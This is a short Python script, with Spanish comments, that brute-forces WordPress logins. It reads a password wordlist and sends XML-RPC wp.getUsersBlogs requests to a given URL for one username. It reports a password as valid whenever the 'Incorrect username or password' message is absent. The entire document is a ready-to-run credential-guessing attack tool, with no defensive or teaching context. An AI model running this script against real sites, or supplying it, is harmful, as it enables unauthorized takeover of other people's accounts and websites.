#!/usr/bin/python3
#coding: utf-8

import requests
from colorama import init, Fore
import time

# Inicializar colorama para Windows
init(autoreset=True)

while True:
    try:
        usuario = input("Usuario: ")
        dic_pass = input("Diccionario: ")
        url = input("URL: ")
    except ValueError:
        print("Debe ingresar un valor")
    break



try:
    with open(dic_pass, 'r') as dic_pass_file:
        print("Archivo " + dic_pass + " encontrado")

        # Leemos cada palabra del diccionario.
        for x in dic_pass_file.readlines():
            # Creamos una variable con los datos del POST
            xml = '''
                <methodCall>
			        <methodName>wp.getUsersBlogs</methodName> 
			        <param><value>%s</value></param>
			        <param><value>%s</value></param>
		        </methodCall>
            '''  % (usuario, x)

            # Realizar la solicitud POST con la URL y datos 
            responde = requests.post(url, data=xml ).text

            
            if "Incorrect username or password" not in responde:
                print(f"Las credenciales: {Fore.RED}%s{Fore.RESET} son válidas " % x.strip("\n"))
                break
                
            else:
                print("Las credenciales: %s inválidas" % x.strip("\n"))
            time.sleep(1)

except FileNotFoundError:
    print("Archivo " + dic_pass + " no encontrado")